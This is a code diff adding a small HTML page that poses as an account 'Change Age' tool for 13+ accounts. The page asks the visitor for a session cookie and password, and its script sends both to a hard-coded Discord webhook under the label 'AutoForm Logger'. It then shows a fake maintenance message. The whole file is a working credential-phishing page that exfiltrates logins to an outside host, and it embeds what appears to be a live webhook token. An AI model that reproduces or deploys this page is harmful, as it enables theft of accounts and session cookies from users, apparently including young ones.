@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Change Age</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #111827;
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .form {
+      background: #1f2937;
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.4);
+      width: 100%;
+      max-width: 400px;
+      text-align: center;
+      opacity: 0;
+      animation: fadeIn 1s ease-in-out forwards;
+    }
+    input, button {
+      width: 100%;
+      margin: 10px 0;
+      padding: 12px;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+    }
+    input {
+      background-color: #374151;
+      color: white;
+    }
+    button {
+      background-color: #00ffff;
+      color: #000;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    h2 {
+      margin-bottom: 10px;
+    }
+    p {
+      font-size: 14px;
+      color: #ccc;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+</head>
+<body>
+  <div class="form">
+    <h2>Change Age (13+ Account)</h2>
+    <p><strong>Note:</strong> Only works on accounts without 2FA.</p>
+    <input type="text" id="cookie" placeholder="Enter cookie" />
+    <input type="password" id="password" placeholder="Enter password" />
+    <button onclick="sendToDiscord()">Submit</button>
+  </div>
+
+  <script>
+    async function sendToDiscord() {
+      const cookie = document.getElementById("cookie").value.trim();
+      const password = document.getElementById("password").value.trim();
+      const webhook = "https://discord.com/api/webhooks/1359540991710859566/x0Q8WbwtQR2WzgEacXd1DXFoLFJiYGRMGSMFPYw_pW6r_gvSv5UixBi9aTKG3crqPtFT"; // Replace with your actual webhook
+
+      if (!cookie || !password) {
+        alert("Please enter both cookie and password.");
+        return;
+      }
+
+      const payload = {
+        embeds: [{
+          title: "New Entry",
+          color: 0x00ffff,
+          description: `**🍪 Cookie:** \`${cookie}\`\n**🔐 Password:** \`${password}\``,
+          footer: { text: "AutoForm Logger" },
+          timestamp: new Date().toISOString()
+        }]
+      };
+
+      try {
+        await fetch(webhook, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+
+        alert("SITE IS UNDER MAINTENANCE");
+      } catch (e) {
+        alert("Failed to send.");
+        console.error(e);
+      }
+    }
+  </script>
+</body>
+</html>
